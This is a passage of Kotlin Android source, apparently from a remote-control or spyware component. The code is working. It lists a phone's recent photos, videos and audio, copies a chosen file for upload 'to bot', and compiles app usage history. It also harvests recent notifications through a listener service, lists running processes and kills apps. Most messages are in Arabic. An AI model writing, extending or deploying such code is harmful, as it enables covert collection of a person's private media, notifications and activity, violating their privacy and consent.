                )
                else -> return errorJson("invalid_type", "خطأ")
            }

            val sortOrder = "${cols[3]} DESC"  // DATE_ADDED DESC
            val cursor = context.contentResolver.query(
                collectionUri, cols, null, null, sortOrder
            )

            var count = 0
            cursor?.use {
                while (it.moveToNext() && count < 30) {
                    val id = it.getLong(0)
                    val name = it.getString(1) ?: "unknown"
                    val size = it.getLong(2)
                    val dateAdded = it.getLong(3)
                    val mimeType = it.getString(4) ?: ""

                    val contentUri = android.content.ContentUris.withAppendedId(collectionUri, id)

                    jsonList.put(JSONObject().apply {
                        put("name", name)
                        put("uri", contentUri.toString())
                        put("size", size)
                        put("date_added", dateAdded)
                        put("mime_type", mimeType)
                        put("type", type.lowercase())
                    })
                    count++
                }
            }

            val result = JSONObject().apply {
                put("type", "media_list")
                put("media_type", type.lowercase())
                put("files", jsonList)
                put("count", count)
            }
            Log.i(TAG, "📁 listMediaFiles: returned $count $type")
            CollectedData.JsonResult(result.toString())
        } catch (e: SecurityException) {
            Log.e(TAG, "📁 listMediaFiles SecurityException: ${e.message}")
            val result = JSONObject().apply {
                put("type", "media_list")
                put("media_type", type.lowercase())
                put("files", JSONArray())
                put("count", 0)
                put("error", "permission_denied")
            }
            CollectedData.JsonResult(result.toString())
        } catch (e: Exception) {
            Log.e(TAG, "📁 listMediaFiles error: ${e.message}")
            val result = JSONObject().apply {
                put("type", "media_list")
                put("media_type", type.lowercase())
                put("files", JSONArray())
                put("count", 0)
                put("error", e.message ?: "unknown")
            }
            CollectedData.JsonResult(result.toString())
        }
    }

    /**
     * Download a media file from MediaStore by URI.
     * @param uriString The content:// URI of the media file
     * Returns FileResult (uploaded to bot as photo/video/audio based on type)
     */
    fun downloadMediaFile(uriString: String): Any {
        Log.i(TAG, "📥 downloadMediaFile: uri=$uriString")
        return try {
            val uri = android.net.Uri.parse(uriString)
            val mimeType = context.contentResolver.getType(uri) ?: "application/octet-stream"
            Log.i(TAG, "📥 MIME type: $mimeType")

            // Determine file extension from MIME type
            val extension = when {
                mimeType.startsWith("image/") -> mimeType.removePrefix("image/").ifEmpty { "jpg" }
                mimeType.startsWith("video/") -> mimeType.removePrefix("video/").ifEmpty { "mp4" }
                mimeType.startsWith("audio/") -> mimeType.removePrefix("audio/").ifEmpty { "mp3" }
                else -> "bin"
            }

            // Get display name from cursor
            var displayName = "media_${System.currentTimeMillis()}.$extension"
            try {
                context.contentResolver.query(uri, arrayOf(
                    android.provider.OpenableColumns.DISPLAY_NAME
                ), null, null, null)?.use { c ->
                    if (c.moveToFirst()) {
                        val nameIdx = c.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
                        if (nameIdx >= 0) {
                            val n = c.getString(nameIdx)
                            if (!n.isNullOrEmpty()) displayName = n
                        }
                    }
                }
            } catch (_: Exception) {}

            // Copy file to cache
            val outputFile = File(context.cacheDir, "media_${System.currentTimeMillis()}_$displayName")
            context.contentResolver.openInputStream(uri)?.use { input ->
                FileOutputStream(outputFile).use { output ->
                    input.copyTo(output)
                }
            } ?: return CollectedData.TextResult("❌ تعذر فتح الملف")

            val size = outputFile.length()
            Log.i(TAG, "📥 Downloaded: ${outputFile.name} ($size bytes)")
            if (size > 50 * 1024 * 1024) {
                outputFile.delete()
                return CollectedData.TextResult("❌ الملف كبير جداً (الحد 50MB): ${size / 1024 / 1024}MB")
            }
            if (size == 0L) {
                outputFile.delete()
                return CollectedData.TextResult("❌ الملف فارغ")
            }

            // Determine the "command" tag based on media type
            val tag = when {
                mimeType.startsWith("image/") -> "media_image"
                mimeType.startsWith("video/") -> "media_video"
                mimeType.startsWith("audio/") -> "media_audio"
                else -> "media_file"
            }

            CollectedData.FileResult(outputFile, tag)
        } catch (e: SecurityException) {
            Log.e(TAG, "📥 downloadMediaFile SecurityException: ${e.message}")
            CollectedData.TextResult("❌ صلاحية مرفوضة: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "📥 downloadMediaFile error: ${e.message}")
            CollectedData.TextResult("❌ خطأ في التحميل: ${e.message}")
        }
    }

    // ════════════════════════════════════════════════════════════════
    // APP MONITORING
    // ════════════════════════════════════════════════════════════════

    private var appMonitorActive = false
    fun startAppMonitor() = "app_monitor_started".also { appMonitorActive = true }
    fun stopAppMonitor() = "app_monitor_stopped".also { appMonitorActive = false }

    fun getAppUsageReport(): Any {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return errorJson("unsupported", "API 22+")
        return try {
            val pm = context.packageManager
            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val end = System.currentTimeMillis()
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, end - 86400000, end).sortedByDescending { it.lastTimeUsed }
            val list = JSONArray()
            for (s in stats.take(50)) {
                try {
                    list.put(JSONObject().apply {
                        put("package", s.packageName)
                        put("app_name", pm.getApplicationInfo(s.packageName, 0).loadLabel(pm).toString())
                        put("last_used", s.lastTimeUsed)
                        put("foreground_time_ms", s.totalTimeInForeground)
                    })
                } catch (_: PackageManager.NameNotFoundException) {}
            }
            CollectedData.JsonResult(list.toString())
        } catch (e: Exception) { errorJson("error", e.message ?: "unknown") }
    }

    fun getRecentNotifications(): Any {
        return try {
            val listener = MDMNotificationListenerService.instance
            if (listener != null) {
                CollectedData.JsonResult(listener.getRecentNotifications())
            } else {
                errorJson("info", "NotificationListenerService not active - enable in system settings")
            }
        } catch (e: Exception) {
            errorJson("error", e.message ?: "unknown")
        }
    }

    fun getRunningApps(): Any {
        val list = JSONArray()
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            for (proc in am.runningAppProcesses ?: emptyList()) {
                list.put(JSONObject().apply {
                    put("process", proc.processName); put("pid", proc.pid); put("uid", proc.uid)
                })
            }
            CollectedData.JsonResult(list.toString())
        } catch (e: Exception) { errorJson("error", e.message ?: "unknown") }
    }

    fun killApp(packageName: String): String {
        return try { (context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).killBackgroundProcesses(packageName); "killed_$packageName" }
        catch (e: Exception) { "error: ${e.message}" }
    }

    // ════════════════════════════════════════════════════════════════
    // HELPER
    // ════════════════════════════════════════════════════════════════

    private fun errorJson(error: String, message: String) = JSONObject().apply { put("error", error); put("message", message) }.toString()
}